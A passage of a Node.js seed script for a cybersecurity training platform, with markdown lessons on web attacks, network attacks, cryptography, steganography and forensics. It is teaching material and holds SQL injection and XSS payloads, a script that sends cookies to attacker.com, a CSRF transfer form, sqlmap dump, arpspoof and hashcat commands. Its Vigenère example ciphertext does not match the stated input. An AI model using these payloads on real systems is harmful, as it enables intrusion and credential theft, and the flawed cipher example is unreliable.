require('dotenv').config({ path: '../.env' });
const mongoose = require('mongoose');

const User = require('../models/User.model');
const Domain = require('../models/Domain.model');
const Challenge = require('../models/Challenge.model');
const LearningModule = require('../models/LearningModule.model');
const Leaderboard = require('../models/Leaderboard.model');

const MONGO_URI = process.env.MONGO_URI || 'mongodb://localhost:27017/cyberverse';

const domains = [
  { name: 'Web Security', slug: 'web-security', description: 'Learn to find and exploit web vulnerabilities like XSS, SQLi, CSRF, and more.', difficulty_level: 'beginner', icon: '🌐', color: '#00bcd4', order: 1 },
  { name: 'Network Security', slug: 'network-security', description: 'Understand network protocols, packet analysis, and network-based attacks.', difficulty_level: 'intermediate', icon: '🔌', color: '#4caf50', order: 2 },
  { name: 'Cryptography', slug: 'cryptography', description: 'Break ciphers and understand modern encryption algorithms.', difficulty_level: 'intermediate', icon: '🔐', color: '#9c27b0', order: 3 },
  { name: 'Reverse Engineering', slug: 'reverse-engineering', description: 'Disassemble and analyze binaries to understand how they work.', difficulty_level: 'advanced', icon: '⚙️', color: '#ff5722', order: 4 },
  { name: 'Forensics', slug: 'forensics', description: 'Investigate digital evidence, analyze file systems and recover hidden data.', difficulty_level: 'intermediate', icon: '🔍', color: '#607d8b', order: 5 },
  { name: 'OSINT', slug: 'osint', description: 'Use open-source intelligence techniques to gather information.', difficulty_level: 'beginner', icon: '📡', color: '#03a9f4', order: 6 },
  { name: 'Malware Analysis', slug: 'malware-analysis', description: 'Analyze malicious software to understand how it operates and how to stop it.', difficulty_level: 'advanced', icon: '🦠', color: '#f44336', order: 7 },
  { name: 'Cloud Security', slug: 'cloud-security', description: 'Secure and attack cloud environments including AWS, Azure, and GCP.', difficulty_level: 'advanced', icon: '☁️', color: '#2196f3', order: 8 },
  { name: 'Binary Exploitation', slug: 'binary-exploitation', description: 'Exploit buffer overflows, format strings, and other binary vulnerabilities.', difficulty_level: 'advanced', icon: '💣', color: '#795548', order: 9 },
];

const getModules = (domainMap) => [

  // ═══════════════════════════════════════════════════════════
  // 🌐 WEB SECURITY — 3 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['web-security'], order: 1, estimated_time: 30,
    title: 'Introduction to Web Security',
    video_url: 'https://www.youtube.com/embed/WlmKwIe9z1Q',
    resources_links: [
      { title: 'OWASP Top 10 Official Guide', url: 'https://owasp.org/www-project-top-ten/', type: 'article' },
      { title: 'PortSwigger Web Security Academy (Free)', url: 'https://portswigger.net/web-security', type: 'article' },
      { title: 'Burp Suite Community Edition', url: 'https://portswigger.net/burp/communitydownload', type: 'tool' },
    ],
    content_markdown: `# Introduction to Web Security

## Overview
Web security refers to the practice of protecting websites, web applications, and web services from security threats that may compromise their integrity, confidentiality, or availability.

In today's digital world, web applications handle sensitive data — banking transactions, medical records, personal communications. A single vulnerability can expose millions of users to risk.

---

## How the Web Works

\`\`\`
User (Browser)
      ↓  HTTP Request
   Web Server
      ↓  Database Query
   Database
      ↑  Data Response
   Web Server
      ↑  HTTP Response
User (Browser)
\`\`\`

**Key Technologies:**
- **HTTP/HTTPS** — Communication protocol
- **HTML/CSS/JS** — Frontend rendering
- **PHP/Python/Node.js** — Backend logic
- **MySQL/MongoDB** — Data storage

---

## OWASP Top 10 — Industry Standard

The Open Web Application Security Project (OWASP) maintains the most referenced list of critical web security risks:

| # | Risk | Impact |
|---|------|--------|
| 1 | Injection (SQLi, CMDi) | Critical |
| 2 | Broken Authentication | Critical |
| 3 | Sensitive Data Exposure | High |
| 4 | XXE Injection | High |
| 5 | Broken Access Control | High |
| 6 | Security Misconfiguration | Medium |
| 7 | XSS | Medium-High |
| 8 | Insecure Deserialization | High |
| 9 | Vulnerable Components | Medium |
| 10 | Insufficient Logging | Medium |

---

## Essential Tools for Web Pentesting

**Burp Suite** — Industry standard web proxy
\`\`\`
- Intercept HTTP requests
- Modify parameters
- Repeater, Intruder, Scanner
\`\`\`

**OWASP ZAP** — Free alternative to Burp Suite

**curl** — Command line HTTP tool
\`\`\`bash
curl -X POST http://target.com/login \\
  -d "username=admin&password=test"
\`\`\`

**Browser DevTools (F12)**
\`\`\`
Network tab → See all HTTP requests
Console tab → JavaScript execution
Storage tab → Cookies, LocalStorage
\`\`\`

---

## Setting Up Your Lab
1. Install **DVWA** (Damn Vulnerable Web App)
2. Install **WebGoat** by OWASP
3. Use **TryHackMe** or **HackTheBox** online labs
4. Practice on **PentesterLab**

> **Important:** Always practice on intentionally vulnerable apps. Never test on systems you don't own!`,
  },
  {
    domain_id: domainMap['web-security'], order: 2, estimated_time: 45,
    title: 'SQL Injection — From Basics to Advanced',
    video_url: 'https://www.youtube.com/embed/ciNHn38EyRc',
    resources_links: [
      { title: 'SQLi Cheat Sheet — PortSwigger', url: 'https://portswigger.net/web-security/sql-injection/cheat-sheet', type: 'article' },
      { title: 'SQLMap — Automated Tool', url: 'https://sqlmap.org', type: 'tool' },
      { title: 'HackTheBox — SQL Injection Labs', url: 'https://academy.hackthebox.com/course/preview/sql-injection-fundamentals', type: 'article' },
    ],
    content_markdown: `# SQL Injection — Complete Guide

## What is SQL Injection?
SQL Injection (SQLi) occurs when an attacker inserts malicious SQL code into a query, manipulating the database to reveal, modify, or delete data.

**CVE Statistics:** SQLi accounts for over 65% of all web application attacks worldwide.

---

## Why Does It Happen?

**Vulnerable PHP Code:**
\`\`\`php
$email = $_POST['email'];  // User input — never trusted!
$query = "SELECT * FROM users WHERE email='" . $email . "'";
$result = mysql_query($query);
\`\`\`

When a user enters: \`' OR '1'='1\`

The query becomes:
\`\`\`sql
SELECT * FROM users WHERE email='' OR '1'='1'
-- This always returns TRUE → Authentication bypassed!
\`\`\`

---

## Types of SQL Injection

### 1. Classic (In-Band) SQLi
**Error Based:**
\`\`\`sql
' AND EXTRACTVALUE(1, CONCAT(0x7e, (SELECT version())))--
\`\`\`

**Union Based:**
\`\`\`sql
' UNION SELECT null, username, password FROM users--
\`\`\`

### 2. Blind SQLi (No visible output)
**Boolean Based:**
\`\`\`sql
' AND 1=1--   (True — page loads normally)
' AND 1=2--   (False — page changes)
\`\`\`

**Time Based:**
\`\`\`sql
'; IF (1=1) WAITFOR DELAY '0:0:5'--
-- Page takes 5 seconds → confirmed vulnerable!
\`\`\`

### 3. Out-of-Band SQLi
Uses DNS/HTTP requests to exfiltrate data externally.

---

## Automated Testing with SQLMap

\`\`\`bash
# Basic scan
sqlmap -u "http://target.com/page?id=1"

# List all databases
sqlmap -u "http://target.com/page?id=1" --dbs

# List tables in database
sqlmap -u "http://target.com/page?id=1" -D dbname --tables

# Dump table data
sqlmap -u "http://target.com/page?id=1" -D dbname -T users --dump

# POST request
sqlmap -u "http://target.com/login" --data="email=test&pass=test"
\`\`\`

---

## Prevention Techniques

**✅ Prepared Statements (Best Practice):**
\`\`\`php
$stmt = $pdo->prepare("SELECT * FROM users WHERE email = ?");
$stmt->execute([$email]);
\`\`\`

**✅ Input Validation:**
\`\`\`python
import re
if not re.match(r'^[a-zA-Z0-9@.]+$', email):
    raise ValueError("Invalid email")
\`\`\`

**✅ Principle of Least Privilege:**
Database user should only have SELECT, INSERT — not DROP, ALTER.

---

## Practice Labs
- **SQLi Lab:** http://testphp.vulnweb.com
- **DVWA:** Install locally
- **HackTheBox:** SQL Injection challenges`,
  },
  {
    domain_id: domainMap['web-security'], order: 3, estimated_time: 40,
    title: 'XSS & CSRF — Client Side Attacks',
    video_url: 'https://www.youtube.com/embed/EoaDgUgS6QA',
    resources_links: [
      { title: 'XSS Game — Google', url: 'https://xss-game.appspot.com', type: 'tool' },
      { title: 'XSS Cheat Sheet', url: 'https://portswigger.net/web-security/cross-site-scripting/cheat-sheet', type: 'article' },
      { title: 'CSRF Prevention Cheat Sheet', url: 'https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html', type: 'article' },
    ],
    content_markdown: `# XSS & CSRF — Client Side Attacks

## Cross-Site Scripting (XSS)

### What is XSS?
XSS allows attackers to inject malicious JavaScript into web pages viewed by other users. The script executes in the victim's browser with the site's full privileges.

### Types of XSS

**1. Reflected XSS**
\`\`\`
URL: https://site.com/search?q=<script>alert('XSS')</script>
Server returns the input directly in HTML response
Script executes immediately in victim's browser
\`\`\`

**2. Stored XSS (Most Dangerous)**
\`\`\`html
<!-- Attacker posts in a comment field: -->
<script>
  fetch('https://attacker.com/steal?c=' + document.cookie)
</script>
<!-- Every user who views this comment gets hacked! -->
\`\`\`

**3. DOM-Based XSS**
\`\`\`javascript
// Vulnerable code:
document.getElementById('output').innerHTML = location.hash;
// Exploit: https://site.com/#<img src=x onerror=alert(1)>
\`\`\`

### Common XSS Payloads
\`\`\`javascript
<script>alert(document.cookie)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
<body onload=alert(1)>
"><script>alert(1)</script>
javascript:alert(1)
\`\`\`

### Real-World XSS Impact
- Session hijacking (steal cookies)
- Credential harvesting (fake login forms)
- Keylogging (capture keystrokes)
- Defacement (modify page content)
- Cryptomining in victim's browser

---

## Cross-Site Request Forgery (CSRF)

### What is CSRF?
CSRF tricks authenticated users into performing unintended actions. The attacker's site sends requests to the target site using the victim's session.

### Example Attack Flow
\`\`\`
1. Victim logs into bank.com
2. Victim visits attacker's evil.com
3. evil.com has hidden form:
   <form action="https://bank.com/transfer" method="POST">
     <input name="amount" value="10000">
     <input name="to" value="attacker_account">
   </form>
   <script>document.forms[0].submit()</script>
4. Bank processes transfer using victim's cookies!
\`\`\`

### Prevention
**XSS Prevention:**
- HTML encode all user output
- Content Security Policy (CSP) headers
- HttpOnly and Secure cookie flags

**CSRF Prevention:**
- CSRF tokens in every form
- SameSite cookie attribute
- Origin/Referer header validation`,
  },

  // ═══════════════════════════════════════════════════════════
  // 🔌 NETWORK SECURITY — 3 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['network-security'], order: 1, estimated_time: 40,
    title: 'Network Fundamentals for Security Professionals',
    video_url: 'https://www.youtube.com/embed/3uhA8bdz8gI',
    resources_links: [
      { title: 'Nmap — Official Documentation', url: 'https://nmap.org/docs.html', type: 'tool' },
      { title: 'Professor Messer — Network+ Free Course', url: 'https://www.professormesser.com/network-plus/n10-008/n10-008-video/n10-008-training-course/', type: 'video' },
      { title: 'Cisco Networking Academy (Free)', url: 'https://skillsforall.com', type: 'article' },
    ],
    content_markdown: `# Network Fundamentals for Security Professionals

## Why Networking Matters in Security
Every cyberattack travels over a network. Understanding how data flows is fundamental to both attacking and defending systems.

---

## The OSI Model — 7 Layers

\`\`\`
┌─────────────────────────────────────┐
│  7. Application  │ HTTP, FTP, DNS   │  ← Where attacks start
├──────────────────┼──────────────────┤
│  6. Presentation │ SSL/TLS, Encrypt │  ← Encryption layer
├──────────────────┼──────────────────┤
│  5. Session      │ Session Mgmt     │  ← Session hijacking
├──────────────────┼──────────────────┤
│  4. Transport    │ TCP, UDP         │  ← Port scanning
├──────────────────┼──────────────────┤
│  3. Network      │ IP, ICMP         │  ← IP spoofing
├──────────────────┼──────────────────┤
│  2. Data Link    │ MAC, Ethernet    │  ← ARP spoofing
├──────────────────┼──────────────────┤
│  1. Physical     │ Cables, WiFi     │  ← Physical access
└─────────────────────────────────────┘
\`\`\`

---

## Critical Ports Every Hacker Knows

| Port | Protocol | Security Relevance |
|------|----------|--------------------|
| 21 | FTP | Often misconfigured, anonymous login |
| 22 | SSH | Brute force target |
| 23 | Telnet | Unencrypted — credentials in plaintext |
| 25 | SMTP | Email spoofing |
| 53 | DNS | DNS poisoning, zone transfers |
| 80/443 | HTTP/S | Web attacks |
| 445 | SMB | EternalBlue, ransomware |
| 3306 | MySQL | Direct DB access if exposed |
| 3389 | RDP | BlueKeep, brute force |

---

## TCP Handshake — 3-Way

\`\`\`
Client          Server
  |──── SYN ────→|   "I want to connect"
  |←── SYN-ACK ──|   "OK, confirmed"
  |──── ACK ────→|   "Connection established"
\`\`\`

**SYN Flood Attack:** Attacker sends thousands of SYN packets without completing handshake → Server resources exhausted (DoS).

---

## Network Scanning with Nmap

\`\`\`bash
# Quick scan — top 1000 ports
nmap 192.168.1.1

# Full port scan with service detection
nmap -sC -sV -p- 192.168.1.1

# Stealth scan (less detectable)
nmap -sS 192.168.1.1

# OS detection
nmap -O 192.168.1.1

# Scan entire network
nmap -sn 192.168.1.0/24

# Output to file
nmap -oN scan.txt 192.168.1.1
\`\`\`

---

## Common Network Attacks

**Man-in-the-Middle (MITM):**
Attacker positions between two communicating parties, intercepting all traffic.

**ARP Spoofing:**
\`\`\`bash
# Attacker sends fake ARP replies
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
\`\`\`

**DNS Spoofing:**
Fake DNS responses redirect users to malicious sites.`,
  },
  {
    domain_id: domainMap['network-security'], order: 2, estimated_time: 35,
    title: 'Packet Analysis with Wireshark',
    video_url: 'https://www.youtube.com/embed/lb1Dw0elw0Q',
    resources_links: [
      { title: 'Wireshark — Official Download', url: 'https://wireshark.org', type: 'tool' },
      { title: 'Wireshark Sample PCAP Files', url: 'https://wiki.wireshark.org/SampleCaptures', type: 'tool' },
      { title: 'Wireshark Display Filter Reference', url: 'https://wiki.wireshark.org/DisplayFilters', type: 'article' },
    ],
    content_markdown: `# Packet Analysis with Wireshark

## What is Wireshark?
Wireshark is the world's most popular network protocol analyzer. It captures network packets in real-time and displays them in human-readable format.

Used by: Security professionals, network engineers, CTF players, and incident responders.

---

## Interface Overview

\`\`\`
┌─────────────────────────────────────────────┐
│  CAPTURE FILTER BAR                         │
├─────────────────────────────────────────────┤
│  PACKET LIST (all captured packets)         │
│  No. | Time | Source | Dest | Protocol | Info│
├─────────────────────────────────────────────┤
│  PACKET DETAILS (selected packet breakdown) │
│  ▶ Frame (physical layer)                   │
│  ▶ Ethernet (data link)                     │
│  ▶ Internet Protocol (network)              │
│  ▶ Transmission Control Protocol (transport)│
│  ▶ HTTP (application)                       │
├─────────────────────────────────────────────┤
│  PACKET BYTES (raw hex + ASCII)             │
└─────────────────────────────────────────────┘
\`\`\`

---

## Essential Display Filters

\`\`\`wireshark
http                         → HTTP traffic only
https or ssl                 → Encrypted traffic
ip.addr == 192.168.1.100     → Specific IP (source or dest)
ip.src == 10.0.0.1           → Source IP filter
tcp.port == 80               → Specific port
http.request.method == POST  → POST requests only
dns                          → DNS queries
ftp                          → FTP traffic
tcp.flags.syn == 1           → SYN packets (port scan detection)
icmp                         → Ping traffic
\`\`\`

---

## Finding Credentials in HTTP Traffic

\`\`\`
Step 1: Filter → http.request.method == POST
Step 2: Click on a login packet
Step 3: In Packet Details → HTML Form URL Encoded
Step 4: Expand → username=admin&password=secret123
\`\`\`

---

## Follow TCP Stream (Game Changer!)

Right Click any packet → **Follow → TCP Stream**

This reconstructs the entire conversation between two hosts. You can see:
- HTTP request + response
- FTP file transfers
- Telnet sessions (full commands!)
- Chat messages

---

## Detecting Common Attacks

**Port Scan Detection:**
\`\`\`
tcp.flags.syn==1 and tcp.flags.ack==0
→ Multiple SYN packets to different ports = Nmap scan!
\`\`\`

**ARP Spoofing Detection:**
\`\`\`
arp
→ Same IP with different MAC addresses = ARP Poisoning!
\`\`\`

**DNS Exfiltration:**
\`\`\`
dns
→ Unusually long DNS queries = Data being smuggled out!
\`\`\`

---

## CTF Tips
- Always check HTTP traffic first
- Look for Base64 encoded strings in URLs
- FTP transfers often contain flag files
- DNS queries might contain encoded flags`,
  },
  {
    domain_id: domainMap['network-security'], order: 3, estimated_time: 45,
    title: 'Network Attacks — MITM, ARP & DNS',
    video_url: 'https://www.youtube.com/embed/A7nih6SANYs',
    resources_links: [
      { title: 'Ettercap — MITM Tool', url: 'https://www.ettercap-project.org', type: 'tool' },
      { title: 'Bettercap — Modern MITM Framework', url: 'https://bettercap.org', type: 'tool' },
      { title: 'MITM Attack Explained', url: 'https://www.imperva.com/learn/application-security/man-in-the-middle-attack-mitm/', type: 'article' },
    ],
    content_markdown: `# Network Attacks — MITM, ARP & DNS

## Man-in-the-Middle (MITM) Attack

### Concept
\`\`\`
Normal:   Alice ←────────────→ Bob
MITM:     Alice ←──→ Attacker ←──→ Bob
          (Attacker sees ALL traffic!)
\`\`\`

The attacker secretly intercepts and potentially alters the communication between two parties.

---

## ARP Spoofing — The Foundation of MITM

### How ARP Works
\`\`\`
Q: "Who has IP 192.168.1.1?" (broadcast)
A: "I do! My MAC is AA:BB:CC:DD:EE:FF"
Devices cache this in ARP table
\`\`\`

### The Attack
\`\`\`
Attacker sends fake ARP replies:
"192.168.1.1 is at MY MAC address" → tells victim
"192.168.1.100 is at MY MAC address" → tells router

Now ALL traffic flows through attacker!
\`\`\`

### Tools
\`\`\`bash
# ARP Spoofing with arpspoof
arpspoof -i eth0 -t 192.168.1.100 192.168.1.1
arpspoof -i eth0 -t 192.168.1.1 192.168.1.100

# Enable IP forwarding (so traffic still flows)
echo 1 > /proc/sys/net/ipv4/ip_forward

# Capture with Wireshark simultaneously
\`\`\`

---

## DNS Spoofing / Cache Poisoning

### How DNS Works
\`\`\`
User: "What is the IP of bank.com?"
DNS:  "It is 198.51.100.1"
User: Connects to 198.51.100.1
\`\`\`

### The Attack
\`\`\`
Attacker poisons DNS cache:
"bank.com = 10.0.0.1 (attacker's server)"
User thinks they're on real bank.com!
\`\`\`

---

## SSL Stripping

Downgrades HTTPS connections to HTTP:
\`\`\`
User → HTTPS → Attacker → HTTP → Server
User thinks connection is secure (no warning in old browsers!)
\`\`\`

---

## Defense Strategies

| Attack | Defense |
|--------|---------|
| ARP Spoofing | Dynamic ARP Inspection (DAI) |
| DNS Spoofing | DNSSEC implementation |
| MITM | Certificate pinning, HSTS |
| SSL Strip | HTTPS everywhere, HSTS preload |

> **Lab Warning:** Only perform these attacks on your own network or in authorized lab environments. MITM attacks on others are illegal.`,
  },

  // ═══════════════════════════════════════════════════════════
  // 🔐 CRYPTOGRAPHY — 3 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['cryptography'], order: 1, estimated_time: 30,
    title: 'Classical Ciphers & Encoding',
    video_url: 'https://www.youtube.com/embed/AQDCe585Lnc',
    resources_links: [
      { title: 'CyberChef — Swiss Army Knife for Crypto', url: 'https://gchq.github.io/CyberChef', type: 'tool' },
      { title: 'dCode — Cipher Identifier', url: 'https://www.dcode.fr/cipher-identifier', type: 'tool' },
      { title: 'CryptoHack — Free Practice Platform', url: 'https://cryptohack.org', type: 'article' },
    ],
    content_markdown: `# Classical Ciphers & Encoding

## Why Study Classical Ciphers?
Classical ciphers appear frequently in CTF competitions and help build intuition for modern cryptography. Understanding their weaknesses teaches us why modern algorithms are designed the way they are.

---

## Caesar Cipher

Named after Julius Caesar who used it for military communications (key = 3).

\`\`\`
Plain:  A B C D E F G H I J K L M N O P Q R S T U V W X Y Z
Cipher: D E F G H I J K L M N O P Q R S T U V W X Y Z A B C

HELLO WORLD → KHOOR ZRUOG (key=3)
\`\`\`

**Cracking:** Only 25 possible keys — try all (brute force)!

---

## ROT13

Special case of Caesar cipher with key=13. Applying it twice returns original.

\`\`\`
HELLO → URYYB
URYYB → HELLO (apply again!)
\`\`\`

Common in CTFs — always try ROT13 on suspicious strings!

---

## Vigenère Cipher

Uses a repeating keyword for polyalphabetic substitution:

\`\`\`
Key:     KEYKEYKEYKEY
Plain:   HELLOWORLD!!
Cipher:  RIJVSAQZCNB
\`\`\`

**Cracking:** Kasiski test → find key length → frequency analysis on each position.

---

## Encoding vs Encryption

> **Important Distinction!**
> Encoding is NOT encryption — it provides no security!

| Type | Purpose | Reversible Without Key? |
|------|---------|------------------------|
| Encoding (Base64, Hex) | Data representation | ✅ Yes |
| Encryption (AES, RSA) | Data security | ❌ No (without key) |
| Hashing (MD5, SHA) | Integrity check | ❌ No |

---

## Base64

\`\`\`
Hello → SGVsbG8=
Decode: echo SGVsbG8= | base64 -d → Hello
\`\`\`
Giveaway: String ends with = or ==

---

## Hex Encoding

\`\`\`
Hello → 48 65 6c 6c 6f
Decode in Python: bytes.fromhex('48656c6c6f').decode()
\`\`\`

---

## Frequency Analysis

In English, letter frequencies:
\`\`\`
Most common: E(12.7%) T(9.1%) A(8.2%) O(7.5%)
Least common: Z(0.07%) Q(0.10%) X(0.15%)
\`\`\`

Find the most frequent ciphertext letter → likely maps to 'E'.

---

## CTF Quick Reference

When you see an unknown cipher:
1. Try **CyberChef Magic** (auto-detect)
2. Try **Base64** decode
3. Try **ROT13**
4. Try **Hex** decode
5. Use **dcode.fr cipher identifier**
6. Look for patterns — repeated characters`,
  },
  {
    domain_id: domainMap['cryptography'], order: 2, estimated_time: 50,
    title: 'Modern Cryptography — AES, RSA & Hashing',
    video_url: 'https://www.youtube.com/embed/O4xNJsjtN6E',
    resources_links: [
      { title: 'FactorDB — Factor Large Numbers', url: 'http://factordb.com', type: 'tool' },
      { title: 'CrackStation — Hash Cracker', url: 'https://crackstation.net', type: 'tool' },
      { title: 'RSA CTF Tool — GitHub', url: 'https://github.com/RsaCtfTool/RsaCtfTool', type: 'tool' },
    ],
    content_markdown: `# Modern Cryptography — AES, RSA & Hashing

## Symmetric Encryption (AES)

Same key for both encryption and decryption.

\`\`\`
Alice              Bob
  |──[Key + Plain]──→ AES ──→ Ciphertext ──→ AES ──→ Plain|
  |                                    [Same Key]          |
\`\`\`

### AES Modes of Operation

| Mode | Security | Notes |
|------|---------|-------|
| ECB | ❌ WEAK | Same plaintext = same ciphertext |
| CBC | ✅ Good | Uses IV (Initialization Vector) |
| CTR | ✅ Good | Stream cipher mode |
| GCM | ✅ Best | Authenticated encryption |

**ECB Penguin Attack:** ECB mode leaks patterns!
\`\`\`
Image encrypted with ECB still shows the penguin outline!
\`\`\`

---

## Asymmetric Encryption (RSA)

Public key encrypts, private key decrypts. The foundation of HTTPS.

### RSA Mathematics
\`\`\`
1. Choose two large primes: p, q
2. n = p × q  (public modulus)
3. φ(n) = (p-1)(q-1)  (Euler's totient)
4. e = 65537  (public exponent, usually)
5. d = e⁻¹ mod φ(n)  (private exponent)

Public Key:  (n, e)
Private Key: (n, d)

Encrypt: c = mᵉ mod n
Decrypt: m = cᵈ mod n
\`\`\`

### RSA CTF Attacks

**1. Small n — Factoring Attack**
\`\`\`python
# If n is small, factor it on factordb.com
# n = p * q
# Once you have p and q → compute private key!
\`\`\`

**2. Common Modulus Attack**
Same n used with different e values → private key derivable.

**3. Small e Attack (e=3)**
If e=3 and message is small: m = ∛c (cube root of ciphertext).

---

## Hashing

One-way function — cannot reverse to get original.

\`\`\`
"password123" → MD5 → 482c811da5d5b4bc6d497ffa98491e38
"password123" → SHA256 → ef92b778bafe771e89245b89ecbc...
\`\`\`

### Hash Algorithm Comparison

| Algorithm | Length | Status |
|-----------|--------|--------|
| MD5 | 128-bit | ⚠️ BROKEN — collision attacks |
| SHA-1 | 160-bit | ⚠️ WEAK — deprecated |
| SHA-256 | 256-bit | ✅ SECURE |
| SHA-512 | 512-bit | ✅ VERY SECURE |
| bcrypt | Variable | ✅ BEST for passwords |

### Hash Cracking Methods

\`\`\`bash
# Dictionary attack with hashcat
hashcat -m 0 hash.txt wordlist.txt  # MD5
hashcat -m 100 hash.txt wordlist.txt  # SHA1

# John the Ripper
john --format=md5crypt hash.txt

# Online: crackstation.net (huge rainbow tables)
\`\`\`

---

## Password Storage Best Practices

\`\`\`python
# WRONG — storing plain MD5
password_hash = md5(password)  # ❌

# CORRECT — using bcrypt with salt
import bcrypt
hashed = bcrypt.hashpw(password.encode(), bcrypt.gensalt(rounds=12))  # ✅
\`\`\``,
  },
  {
    domain_id: domainMap['cryptography'], order: 3, estimated_time: 35,
    title: 'Steganography & Hidden Messages',
    video_url: 'https://www.youtube.com/embed/TWEXCYQKyDc',
    resources_links: [
      { title: 'StegOnline — Browser Steg Tool', url: 'https://stegonline.georgeom.net', type: 'tool' },
      { title: 'Steghide — CLI Tool', url: 'http://steghide.sourceforge.net', type: 'tool' },
      { title: 'AperiSolve — All-in-One Steg', url: 'https://www.aperisolve.com', type: 'tool' },
    ],
    content_markdown: `# Steganography & Hidden Messages

## What is Steganography?
Steganography is the art of hiding data within other data. Unlike cryptography (which makes data unreadable), steganography hides the fact that a message exists at all.

*"Security through obscurity"*

---

## Common Steganography Techniques

### LSB (Least Significant Bit)
Each pixel in an image has RGB values (0-255). Modifying the last bit is invisible to the human eye but can store data.

\`\`\`
Original pixel: 11010100 (212)
Modified pixel: 11010101 (213) ← stores bit '1'
Difference: invisible!
\`\`\`

### Text Steganography
- Extra spaces at end of lines
- Zero-width characters
- First letter of each word (acrostic)

### Audio Steganography
- Hidden data in audio spectrum
- Spectrogram reveals image patterns

---

## Tools & Techniques

### steghide (Most Common in CTFs)
\`\`\`bash
# Extract hidden data
steghide extract -sf image.jpg
steghide extract -sf image.jpg -p "password"

# Embed data
steghide embed -cf image.jpg -ef secret.txt
\`\`\`

### binwalk (Find Hidden Files)
\`\`\`bash
binwalk suspicious.jpg          # Scan
binwalk -e suspicious.jpg       # Extract embedded files
\`\`\`

### strings (Quick First Check)
\`\`\`bash
strings image.jpg | grep -i flag
strings image.jpg | grep "CV{"
\`\`\`

### exiftool (Metadata Analysis)
\`\`\`bash
exiftool image.jpg
# Check: Comment, Artist, Copyright fields
# Flags are often hidden in metadata!
\`\`\`

### zsteg (PNG/BMP steganography)
\`\`\`bash
zsteg image.png        # Automatic scan
zsteg -a image.png     # Try all methods
\`\`\`

---

## CTF Steganography Checklist

\`\`\`
1. file image.jpg          → Check file type
2. strings image.jpg       → Look for text/flags
3. exiftool image.jpg      → Check metadata
4. binwalk image.jpg       → Find embedded files
5. steghide extract        → Try without password
6. Try stegonline.com      → LSB analysis
7. Try aperisolve.com      → Automated all tools
8. Open in hex editor      → Check file end (appended data)
9. spectrogram (audio)     → Sonic Visualiser
\`\`\``,
  },

  // ═══════════════════════════════════════════════════════════
  // 🔍 FORENSICS — 3 Modules
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['forensics'], order: 1, estimated_time: 40,
    title: 'Digital Forensics — Evidence & File Analysis',
    video_url: 'https://www.youtube.com/embed/Bjk8WgJlzaY',
    resources_links: [
      { title: 'Autopsy — Free Forensics Tool', url: 'https://www.autopsy.com', type: 'tool' },
      { title: 'Volatility — Memory Forensics', url: 'https://volatilityfoundation.org', type: 'tool' },
      { title: 'SANS Digital Forensics Resources', url: 'https://digital-forensics.sans.org/community/downloads', type: 'article' },
    ],
    content_markdown: `# Digital Forensics — Evidence & File Analysis

## What is Digital Forensics?
Digital forensics is the process of collecting, preserving, analyzing, and presenting digital evidence in a legally admissible manner.

Used in: Criminal investigations, corporate incident response, CTF competitions.

---

## The Forensics Process

\`\`\`
1. IDENTIFICATION
   Identify potential evidence sources
   (hard drives, RAM, network logs, phones)

2. PRESERVATION
   Create forensic image (bit-for-bit copy)
   Never work on original evidence!
   Maintain chain of custody

3. ANALYSIS
   Examine the copy for evidence
   Recover deleted files, artifacts

4. DOCUMENTATION
   Document all findings
   Create timeline of events

5. PRESENTATION
   Present findings in court / report
\`\`\`

---

## File Signatures (Magic Bytes)

Every file type has a unique signature at the start. This is how forensic tools identify file types — regardless of extension.

\`\`\`
Format  Magic Bytes (Hex)     ASCII
───────────────────────────────────
PNG     89 50 4E 47           ‰PNG
JPEG    FF D8 FF              ÿØÿ
PDF     25 50 44 46           %PDF
ZIP     50 4B 03 04           PK..
GIF     47 49 46 38           GIF8
EXE     4D 5A                 MZ
RAR     52 61 72 21           Rar!
MP3     49 44 33              ID3
\`\`\`

**CTF Tip:** File extensions can be changed/faked. Always check magic bytes!
\`\`\`bash
xxd file.jpg | head -5    # View hex dump
file suspicious.txt        # Linux file type detection
\`\`\`

---

## File Carving

Recovering deleted or hidden files from raw disk images:

\`\`\`bash
# Foremost — carve by file signature
foremost -i disk.img -o output_folder/
foremost -t jpg,png,pdf -i disk.img -o output/

# PhotoRec — powerful file recovery
photorec disk.img

# Binwalk — find embedded files
binwalk -e firmware.bin
\`\`\`

---

## Metadata Analysis

Files contain hidden metadata revealing creation time, location, author:

\`\`\`bash
exiftool document.pdf
# GPS Location in photos → attacker location!
# Author name in Word docs → real identity!
# Camera model in photos → device fingerprint
\`\`\`

---

## Common Forensics Artifacts (Windows)

| Artifact | Location | Information |
|---------|----------|-------------|
| Event Logs | C:\\Windows\\System32\\winevt | Login history, errors |
| Prefetch | C:\\Windows\\Prefetch | Programs run |
| Registry | HKLM, HKCU | System config, activity |
| Browser History | AppData\\...\\History | Visited URLs |
| Recycle Bin | $Recycle.Bin | Deleted files |
| LNK Files | Recent\\ | Recently opened files |`,
  },
  {
    domain_id: domainMap['forensics'], order: 2, estimated_time: 50,
    title: 'Memory Forensics with Volatility',
    video_url: 'https://www.youtube.com/embed/E_N1TUFzCMs',
    resources_links: [
      { title: 'Volatility 3 — Official Docs', url: 'https://volatility3.readthedocs.io', type: 'tool' },
      { title: 'Volatility Cheat Sheet', url: 'https://blog.onfvp.com/post/volatility-cheatsheet/', type: 'article' },
      { title: 'MemLabs — Practice Memory Forensics', url: 'https://github.com/stuxnet999/MemLabs', type: 'tool' },
    ],
    content_markdown: `# Memory Forensics with Volatility

## Why Memory Forensics?
RAM contains volatile data that disappears when power is cut:
- Running processes and their memory
- Active network connections
- Encryption keys (even for BitLocker!)
- Passwords and credentials
- Malware that only lives in memory (fileless malware)

---

## Capturing Memory

\`\`\`bash
# Windows — WinPmem
winpmem.exe memory.raw

# Linux — LiME (Loadable Kernel Module)
insmod lime.ko "path=/memory.lime format=lime"

# Virtual Machines — suspend VM
# .vmem file is the memory dump!
\`\`\`

---

## Volatility 3 — Core Commands

### System Information
\`\`\`bash
# Identify OS and profile
python3 vol.py -f memory.raw windows.info

# Environment variables
python3 vol.py -f memory.raw windows.envars
\`\`\`

### Process Analysis
